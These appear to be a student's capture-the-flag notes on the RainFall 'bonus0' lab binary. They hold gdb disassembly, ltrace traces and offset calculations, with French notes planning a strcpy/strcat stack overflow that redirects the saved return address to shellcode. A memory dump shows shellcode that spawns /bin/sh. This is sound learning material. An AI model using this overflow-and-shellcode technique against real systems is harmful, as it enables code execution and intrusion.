  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0

(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40
   0x080485ad <+9>:	lea    eax,[esp+0x16]
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.

(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   ebp
   0x0804851f <+1>:	mov    ebp,esp
   0x08048521 <+3>:	push   edi
   0x08048522 <+4>:	push   ebx
   0x08048523 <+5>:	sub    esp,0x50
   0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:	lea    eax,[ebp-0x30]
   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    eax,[ebp-0x30]
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    ebx,0x80486a4
   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:	mov    edx,eax
   0x0804856f <+81>:	mov    eax,0x0
   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:	mov    edi,edx
   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:	mov    eax,ecx
   0x0804857d <+95>:	not    eax
   0x0804857f <+97>:	sub    eax,0x1
   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:	mov    WORD PTR [eax],dx
   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    esp,0x50
   0x080485a0 <+130>:	pop    ebx
   0x080485a1 <+131>:	pop    edi
   0x080485a2 <+132>:	pop    ebp
   0x080485a3 <+133>:	ret
End of assembler dump.

(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   0x080484b7 <+3>:	sub    esp,0x1018
   0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:	lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.

***************************

bonus0@RainFall:~$ ltrace ./bonus0
__libc_start_main(0x80485a4, 1, 0xbffff7b4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " -
)                                                                   = 4
read(0, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 4096)                          = 42
strchr("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., '\n')                           = "\n"
strncpy(0xbffff698, "aaaaaaaaaaaaaaaaaaaa", 20)                               = 0xbffff698
puts(" - " -
)                                                                   = 4
read(0, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 4096)                          = 35
strchr("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., '\n')                           = "\naaaaaa"
strncpy(0xbffff6ac, "aaaaaaaaaaaaaaaaaaaa", 20)                               = 0xbffff6ac
strcpy(0xbffff6e6, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)                     = 0xbffff6e6
strcat("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., "aaaaaaaaaaaaaaaaaaaa\364\017\375\267") = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...
puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�� aaaaaaaaaaaaaaaaaaaa��
)                                   = 70
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

 **********************************
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0 null
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�� AAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)


Find buffer to overwrite eip (9 from the second read)
*************************************
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0 null
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
AAAAAAAAADCCCCCCCCCCCCCCCCCCCCCCCCC

Breakpoint 1, 0x08048598 in pp ()
(gdb) c
Continuing.

Breakpoint 2, 0x080485c0 in main ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAADCCCCCCCCCC�� AAAAAAAAADCCCCCCCCCC��

Program received signal SIGSEGV, Segmentation fault.
0x43434344 in ?? ()
(gdb)

****************************************************************
(gdb) x/s 0xbffff6d6
0xbffff6d6:	 'A' <repeats 17 times>, " ", 'A' <repeats 20 times>"\364, ", <incomplete sequence \375\267>


******BUFFER_READ********************************
(gdb) x/4s 0xbfffe650
0xbfffe650:	 "BBBBBBBBBx���B"
0xbfffe665:	 'A' <repeats 32 times>, "1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ"
0xbfffe70b:	 ""
0xbfffe70c:	 ""


******FIND_EIP_OFFSET********************************
(gdb) b *0x080485b9
Breakpoint 2 at 0x80485b9
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus0/bonus0
 -
AAA
 -
BBB

Breakpoint 2, 0x080485b9 in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40
   0x080485ad <+9>:	lea    eax,[esp+0x16]
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>
=> 0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.

(gdb) i r eax
eax            0xbffff6d6	-1073744170

(gdb) x/s 0xbffff6d6
0xbffff6d6:	 "AAA BBB"

(gdb) info frame
Stack level 0, frame at 0xbffff710:
 eip = 0x80485b9 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff708, args:
 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
 Saved registers:
  ebp at 0xbffff708, eip at 0xbffff70c

(gdb) x/x 0xbffff70c
0xbffff70c:	0xd3

(gdb) x/w 0xbffff70c
0xbffff70c:	0xb7e454d3

(gdb) p/d 0xbffff70c - 0xbffff6d6
$1 = 54

(gdb) p/s 0xbffff6d6
$2 = 3221223126

(gdb) p/20s 0xbffff6d6 - 20
Item count other than 1 is meaningless in "print" command.

(gdb) x/20s 0xbffff6d6 - 20
0xbffff6c2:	 "\377\277ؘ\004\b\001"
0xbffff6ca:	 ""
0xbffff6cb:	 ""
0xbffff6cc:	 "]\203\004\b\344\023\375\267\026"
0xbffff6d6:	 "AAA BBB"
0xbffff6de:	 "\004\b\377\377\377\377\306\355\345\267\364\017\375\267U\356巀\322\376\267"
0xbffff6f5:	 ""
0xbffff6f6:	 ""
0xbffff6f7:	 ""
0xbffff6f8:	 "م\004\b\364\017\375\267Ѕ\004\b"
0xbffff705:	 ""
0xbffff706:	 ""
0xbffff707:	 ""
0xbffff708:	 ""
0xbffff709:	 ""
0xbffff70a:	 ""
0xbffff70b:	 ""
0xbffff70c:	 "\323T\344\267\001"
0xbffff712:	 ""
0xbffff713:	 ""


*************************************
(gdb) b *0x080485b9
Note: breakpoint 2 also set at pc 0x80485b9.
Breakpoint 3 at 0x80485b9
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x080485b9 in main ()
(gdb) ir eax
Undefined command: "ir".  Try "help".
(gdb) i r eax
eax            0xbffff6d6	-1073744170
(gdb) x/s 0xbffff6d6
0xbffff6d6:	 'A' <repeats 20 times>, 'B' <repeats 19 times>, " ", 'B' <repeats 19 times>
(gdb)

au debut : eip at 0xbffff70c
addresse du buffer
=> (gdb) p/x $ebp -0x1008
$4 = 0xbfffe650
p écrit au même endroit à chaque fois

eip at the end is 54 bytes after adress of main's buffer : 0xbffff6d6

ecrire shellcode dans buffer du read sans qu'il soit écrasé par la deuxième chaine

remplacer eip du main par addresse du shellcode

=> écrire ça à buffer+54 : buffer du main (0xbffff6d6)